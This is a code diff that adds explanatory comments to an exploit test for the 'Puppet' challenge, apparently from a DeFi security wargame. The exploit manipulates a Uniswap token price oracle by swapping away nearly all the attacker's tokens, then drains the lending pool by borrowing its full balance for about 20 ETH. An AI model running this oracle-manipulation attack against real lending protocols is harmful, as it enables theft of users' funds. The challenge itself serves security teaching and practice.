@@ -136,40 +136,47 @@ describe("[Challenge] Puppet", function () {
   });
 
   it("Exploit", async function () {
+    // logs the theoretical required amount of ETH needed to be deposited BEFORE price
+    // oracle manipulation if we wanted to borrow all the available DVTs
     console.log(
       ethers.utils.formatEther(
         await this.lendingPool.calculateDepositRequired(
           POOL_INITIAL_TOKEN_BALANCE
         )
       )
-    );
+    ); // for the moment this amount is too big, we do not own 200K ETH
 
+    // From now on, the attacker will send all the transactions, so we connect him to the contracts
     this.uniswapExchange = this.uniswapExchange.connect(attacker);
     this.token = this.token.connect(attacker);
     this.lendingPool = this.lendingPool.connect(attacker);
 
+    // Attacker approves the exchange for his DVT tokens, then swaps almost all his DVTs for ETH to manipulate its price
     await this.token.approve(
       this.uniswapExchange.address,
       ATTACKER_INITIAL_TOKEN_BALANCE
     );
     await this.uniswapExchange.tokenToEthSwapInput(
-      ATTACKER_INITIAL_TOKEN_BALANCE.sub(1),
+      ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), // sub(1) needed for last success condition
       calculateTokenToEthInputPrice(
         ATTACKER_INITIAL_TOKEN_BALANCE.sub(1),
         UNISWAP_INITIAL_TOKEN_RESERVE,
         UNISWAP_INITIAL_ETH_RESERVE
-      ),
-      (await ethers.provider.getBlock("latest")).timestamp + 1
+      ), // optimal amount of ETH that we should receive, to avoid sandwiching
+      (await ethers.provider.getBlock("latest")).timestamp + 1 // deadline timestamp, a little bigger than latest timestamp
     );
 
+    // logs the required amount of ETH needed to be deposited to be able to borrow
+    // all the available DVTs AFTER price oracle manipulation
     console.log(
       ethers.utils.formatEther(
         await this.lendingPool.calculateDepositRequired(
           POOL_INITIAL_TOKEN_BALANCE
         )
       )
-    );
+    ); // approx. 19.664ETH : great, we happened to have more than 25ETH at this stage.
 
+    // Drain all the DVTs owned by PuppetPool:
     await this.lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, {
       value: ethers.utils.parseUnits("20", "ether"),
     });
